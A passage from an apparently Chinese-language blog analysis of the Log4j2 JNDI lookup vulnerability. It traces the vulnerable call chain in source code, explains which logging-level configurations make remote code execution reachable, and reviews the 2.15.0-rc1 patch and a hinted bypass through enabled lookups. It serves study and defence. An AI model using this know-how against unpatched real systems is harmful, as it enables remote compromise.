+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> String <span class="title function_">resolveVariable</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String variableName, <span class="keyword">final</span> StringBuilder buf,</span></span><br><span class="line"><span class="params">                                    <span class="keyword">final</span> <span class="type">int</span> startPos, <span class="keyword">final</span> <span class="type">int</span> endPos)</span> &#123;</span><br><span class="line">    <span class="comment">// 获取变量解析器</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">resolver</span> <span class="operator">=</span> getVariableResolver();</span><br><span class="line">    <span class="keyword">if</span> (resolver == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> resolver.lookup(event, variableName);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115222343.png"></p>
+<p>这个方法用于解析变量值的内部方法，进入Interpolator中的lookup方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, String <span class="keyword">var</span>)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">var</span> == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 查找:分隔符的位置，PREFIX_SEPARATOR为:</span></span><br><span class="line">    <span class="keyword">final</span> <span class="type">int</span> <span class="variable">prefixPos</span> <span class="operator">=</span> <span class="keyword">var</span>.indexOf(PREFIX_SEPARATOR);</span><br><span class="line">    <span class="comment">// 存在:</span></span><br><span class="line">    <span class="keyword">if</span> (prefixPos &gt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">// 获取前缀</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">prefix</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(<span class="number">0</span>, prefixPos).toLowerCase(Locale.US);</span><br><span class="line">        <span class="comment">// 获取后缀</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">        <span class="comment">// 根据前缀在map中获取对应的StrLookup对象</span></span><br><span class="line">        <span class="keyword">final</span> <span class="type">StrLookup</span> <span class="variable">lookup</span> <span class="operator">=</span> strLookupMap.get(prefix);</span><br><span class="line">        <span class="keyword">if</span> (lookup <span class="keyword">instanceof</span> ConfigurationAware) &#123;</span><br><span class="line">            ((ConfigurationAware) lookup).setConfiguration(configuration);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">        <span class="comment">//存在lookup</span></span><br><span class="line">        <span class="keyword">if</span> (lookup != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 关键在这里</span></span><br><span class="line">            value = event == <span class="literal">null</span> ? lookup.lookup(name) : lookup.lookup(event, name);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (value != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> value;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">var</span> = <span class="keyword">var</span>.substring(prefixPos + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (defaultLookup != <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> event == <span class="literal">null</span> ? defaultLookup.lookup(<span class="keyword">var</span>) : defaultLookup.lookup(event, <span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115224135.png"><br>在strLookupMap中键名为”jndi”的值为JndiLookup对象，进入JndiLookup类的lookup方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> String <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> String key)</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> (key == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">jndiName</span> <span class="operator">=</span> convertJndiName(key);</span><br><span class="line">    <span class="keyword">try</span> (<span class="keyword">final</span> <span class="type">JndiManager</span> <span class="variable">jndiManager</span> <span class="operator">=</span> JndiManager.getDefaultManager()) &#123;</span><br><span class="line">        <span class="comment">// 调用jndiManager.lookup(jndiName)方法获取JNDI对象，然后通过toString方法输出</span></span><br><span class="line">        <span class="keyword">return</span> Objects.toString(jndiManager.lookup(jndiName), <span class="literal">null</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (<span class="keyword">final</span> NamingException e) &#123;</span><br><span class="line">        LOGGER.warn(LOOKUP, <span class="string">&quot;Error looking up JNDI resource [&#123;&#125;].&quot;</span>, jndiName, e);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115224535.png"><br>进入JndiManager类的lookup方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231115224747.png"><br>这里的context是InitialContext对象，调用其lookup方法，下面就是JNDI中的链了</p>
+<h2 id="代码关键点"><a href="#代码关键点" class="headerlink" title="代码关键点"></a>代码关键点</h2><p>三个关键点：</p>
+<ol>
+<li>在PatternLayout类的toSerializable方法中，调用MessagePatternConverter的format方法，这个方法是一个格式化的过程，将格式化的内容添加到workingBuilder中，也就是将源代码中的message替换{}，同时匹配字符串中是否存在${}占位符，并使用config.getStrSubstitutor().replace进行替换</li>
+<li>在StrSubstitutor类的substitute方法中，提取${}中的内容，并调用StrSubstitutor类resolveVariable方法对其解析</li>
+<li>在Interpolator类的lookup方法中，根据前缀在map中获取对应的StrLookup对象，然后调用其lookup方法，这里的前缀为jndi，所以获取的是JndiLookup对象，然后调用其lookup方法，这个方法调用了jndiManager.lookup方法</li>
+</ol>
+<h2 id="试试info方法"><a href="#试试info方法" class="headerlink" title="试试info方法"></a>试试info方法</h2><p>在StandardLevel类中定义了日志的级别，数值越低，优先级越高</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">enum</span> <span class="title class_">StandardLevel</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * No events will be logged.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    OFF(<span class="number">0</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A severe error that will prevent the application from continuing.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    FATAL(<span class="number">100</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * An error in the application, possibly recoverable.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ERROR(<span class="number">200</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * An event that might possible lead to an error.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    WARN(<span class="number">300</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * An event for informational purposes.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    INFO(<span class="number">400</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A general debugging event.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    DEBUG(<span class="number">500</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * A fine-grained debug message, typically capturing the flow through the application.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    TRACE(<span class="number">600</span>),</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * All events should be logged.</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    ALL(Integer.MAX_VALUE);</span><br><span class="line">    ....</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>分析</strong>：<br>首先进入AbstractLogger类的logIfEnabled方法，这个方法</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">logIfEnabled</span><span class="params">(<span class="keyword">final</span> String fqcn, <span class="keyword">final</span> Level level, <span class="keyword">final</span> Marker marker, <span class="keyword">final</span> String message,</span></span><br><span class="line"><span class="params">        <span class="keyword">final</span> Object p0)</span> &#123;</span><br><span class="line">    <span class="comment">// 必须过if判断</span></span><br><span class="line">    <span class="keyword">if</span> (isEnabled(level, marker, message, p0)) &#123;</span><br><span class="line">        logMessage(fqcn, level, marker, message, p0);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>跳过中间一步来到Logger类的filter方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231116144706.png"><br>很显然返回的是false，从而在logIfEnabled中不会调用logMessage方法</p>
+<p>问题：intLevel从哪里来的？<br>这里的intLevel是为200，默认等于ERROR等级，也就是说，<strong>在默认情况下，等级值小于ERROR等级的都会造成RCE</strong></p>
+<p>当然这个也能从配置文件中来<br>log4j的默认配置文件如下：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;error&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>现在将Root的level改为info</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">Configuration</span> <span class="attr">status</span>=<span class="string">&quot;WARN&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Appenders</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Console</span> <span class="attr">name</span>=<span class="string">&quot;Console&quot;</span> <span class="attr">target</span>=<span class="string">&quot;SYSTEM_OUT&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">PatternLayout</span> <span class="attr">pattern</span>=<span class="string">&quot;%d&#123;HH:mm:ss.SSS&#125; [%t] %-5level %logger&#123;36&#125; - %msg%n&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Console</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Appenders</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">Loggers</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">Root</span> <span class="attr">level</span>=<span class="string">&quot;info&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">AppenderRef</span> <span class="attr">ref</span>=<span class="string">&quot;Console&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">Root</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">Loggers</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">Configuration</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231116162949.png"><br>能够成功过这个条件，从而导致RCE<br>至于配置文件的加载来自于LogManager.getLogger(…)，这里不再赘述</p>
+<h1 id="log4j-2-15-0-rc1分析"><a href="#log4j-2-15-0-rc1分析" class="headerlink" title="log4j-2.15.0-rc1分析"></a>log4j-2.15.0-rc1分析</h1><h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p><a target="_blank" rel="noopener" href="https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1">https://github.com/apache/logging-log4j2/releases/tag/log4j-2.15.0-rc1</a><br>下载源码进行编译，测试中导入log4j-api-2.15.0和log4j-core-2.15.0即可</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><p>2.15.0-rc1版本对前面存在的问题进行了修复，主要有以下：<br><strong>第一</strong>：<br>对应前一节代码关键点的第一点，在toSerializable方法处调用的不再是MessagePatternConverter的format方法，而是SimpleMessagePatternConverter的format方法<br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119154921.png"></p>
+<p>查看SimpleMessagePatternConverter的format方法：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">class</span> <span class="title class_">SimpleMessagePatternConverter</span> <span class="keyword">extends</span> <span class="title class_">MessagePatternConverter</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">MessagePatternConverter</span> <span class="variable">INSTANCE</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">SimpleMessagePatternConverter</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SimpleMessagePatternConverter</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>(<span class="literal">null</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">format</span><span class="params">(<span class="keyword">final</span> LogEvent event, <span class="keyword">final</span> StringBuilder toAppendTo)</span> &#123;</span><br><span class="line">        <span class="comment">// 直接格式化后结束</span></span><br><span class="line">        <span class="type">Message</span> <span class="variable">msg</span> <span class="operator">=</span> event.getMessage();</span><br><span class="line">        <span class="keyword">if</span> (msg <span class="keyword">instanceof</span> StringBuilderFormattable) &#123;</span><br><span class="line">            ((StringBuilderFormattable)msg).formatTo(toAppendTo);</span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (msg != <span class="literal">null</span>) &#123;</span><br><span class="line">            toAppendTo.append(msg.getFormattedMessage());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>这里的SimpleMessagePatternConverter中的format方法没有解析”${“，而是将字符格式化后就结束，所以也没有后面的调用步骤</p>
+<p>另外，对于MessagePatternConverter类创建了以下四个内部类：</p>
+<ul>
+<li>SimpleMessagePatternConverter</li>
+<li>FormattedMessagePatternConverter</li>
+<li>LookupMessagePatternConverter</li>
+<li>RenderingPatternConverter</li>
+</ul>
+<p>默认情况下是会使用SimpleMessagePatternConverter进行处理，但是对于不同配置的情况下会使用对应配置的内部类进行处理</p>
+<p>针对于rc1绕过的一点就来自于这里，LookupMessagePatternConverter会对”${“进行处理，而在配置文件中开启lookups就会使用LookupMessagePatternConverter内部类，这里后面会提到。而在这一版本中，lookups默认是不开启的，这也是与之前版本不同的一点</p>
+<p><strong>总结下来：第一点更新就是对MessagePatternConverter类进行了处理，并修改了format的逻辑，同时移除了从 Properties 中获取 Lookup 配置的选项，默认不开启lookup功能</strong></p>
+<p><strong>第二</strong>：<br>对应前一节代码关键点的第一点，这里在JndiManager类的lookup方法中进行了白名单限制</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">synchronized</span> &lt;T&gt; T <span class="title function_">lookup</span><span class="params">(<span class="keyword">final</span> String name)</span> <span class="keyword">throws</span> NamingException &#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">URI</span> <span class="variable">uri</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">URI</span>(name);</span><br><span class="line">        <span class="keyword">if</span> (uri.getScheme() != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// 检查协议是否在允许的白名单列表</span></span><br><span class="line">            <span class="keyword">if</span> (!<span class="built_in">this</span>.allowedProtocols.contains(uri.getScheme().toLowerCase(Locale.ROOT))) &#123;</span><br><span class="line">                LOGGER.warn(<span class="string">&quot;Log4j JNDI does not allow protocol &#123;&#125;&quot;</span>, uri.getScheme());</span><br><span class="line">                <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 检查协议是否是LDAP或LDAPS</span></span><br><span class="line">            <span class="keyword">if</span> (<span class="string">&quot;ldap&quot;</span>.equalsIgnoreCase(uri.getScheme()) || <span class="string">&quot;ldaps&quot;</span>.equalsIgnoreCase(uri.getScheme())) &#123;</span><br><span class="line">                <span class="comment">// 检查主机名是否在允许的白名单列表 allowedHosts中</span></span><br><span class="line">                <span class="keyword">if</span> (!<span class="built_in">this</span>.allowedHosts.contains(uri.getHost())) &#123;</span><br><span class="line">                    LOGGER.warn(<span class="string">&quot;Attempt to access ldap server not in allowed list&quot;</span>);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 获取指定名称的JNDI属性</span></span><br><span class="line">                <span class="type">Attributes</span> <span class="variable">attributes</span> <span class="operator">=</span> <span class="built_in">this</span>.context.getAttributes(name);</span><br><span class="line">                <span class="keyword">if</span> (attributes != <span class="literal">null</span>) &#123;</span><br><span class="line">                    Map&lt;String, Attribute&gt; attributeMap = <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line">                    NamingEnumeration&lt;? <span class="keyword">extends</span> <span class="title class_">Attribute</span>&gt; enumeration = attributes.getAll();</span><br><span class="line">                    <span class="comment">// 获取属性的枚举，并将属性及其ID存储到 attributeMap 中</span></span><br><span class="line">                    Attribute classNameAttr;</span><br><span class="line">                    <span class="keyword">while</span>(enumeration.hasMore()) &#123;</span><br><span class="line">                        classNameAttr = (Attribute)enumeration.next();</span><br><span class="line">                        attributeMap.put(classNameAttr.getID(), classNameAttr);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// 从 attributeMap 中获取名为 CLASS_NAME 的属性</span></span><br><span class="line">                    classNameAttr = (Attribute)attributeMap.get(<span class="string">&quot;javaClassName&quot;</span>);</span><br><span class="line">                    <span class="comment">// 检查是否存在名为 SERIALIZED_DATA 的属性</span></span><br><span class="line">                    <span class="keyword">if</span> (attributeMap.get(<span class="string">&quot;javaSerializedData&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (classNameAttr == <span class="literal">null</span>) &#123;</span><br><span class="line">                            LOGGER.warn(<span class="string">&quot;No class name provided for &#123;&#125;&quot;</span>, name);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="type">String</span> <span class="variable">className</span> <span class="operator">=</span> classNameAttr.get().toString();</span><br><span class="line">                        <span class="comment">// 检查 className 是否在允许的白名单列表 allowedClasses 中</span></span><br><span class="line">                        <span class="keyword">if</span> (!<span class="built_in">this</span>.allowedClasses.contains(className)) &#123;</span><br><span class="line">                            LOGGER.warn(<span class="string">&quot;Deserialization of &#123;&#125; is not allowed&quot;</span>, className);</span><br><span class="line">                            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="comment">// // 如果存在名为 REFERENCE_ADDRESS 或 OBJECT_FACTORY 的属性，则记录警告日志并返回null  </span></span><br><span class="line">                    <span class="keyword">else</span> <span class="keyword">if</span> (attributeMap.get(<span class="string">&quot;javaReferenceAddress&quot;</span>) != <span class="literal">null</span> || attributeMap.get(<span class="string">&quot;javaFactory&quot;</span>) != <span class="literal">null</span>) &#123;</span><br><span class="line">                        LOGGER.warn(<span class="string">&quot;Referenceable class is not allowed for &#123;&#125;&quot;</span>, name);</span><br><span class="line">                        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// // 捕获 URISyntaxException 异常 </span></span><br><span class="line">    <span class="keyword">catch</span> (URISyntaxException var8) &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 如果没有触发任何警告或异常，执行JNDI查找操作</span></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.context.lookup(name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119195600.png"><br><img src="https://cdn.jsdelivr.net/gh/DiliLearngent/Dili-Image@main/pictures/20231119173441.png"></p>
+<p>而这里jndiManager对象的构造来自于JndiLookup类中的lookup方法中的如下代码：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">JndiManager</span> <span class="variable">jndiManager</span> <span class="operator">=</span> JndiManager.getDefaultManager();</span><br></pre></td></tr></table></figure>
+
+<p>进入JndiManager类的getDefaultManager</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> JndiManager <span class="title function_">getDefaultManager</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="keyword">return</span> (JndiManager)getManager(JndiManager.class.getName(), FACTORY, (Object)<span class="literal">null</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>由于JndiManager中没有定义getManager，调用父类AbstractManager的getManager方法，观察下面这句</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">manager = (AbstractManager)factory.createManager(name, data);</span><br></pre></td></tr></table></figure>
+
+<p>此时的factory是JndiManagerFactory(JndiManager的内部类)，进入其createManager方法</p>
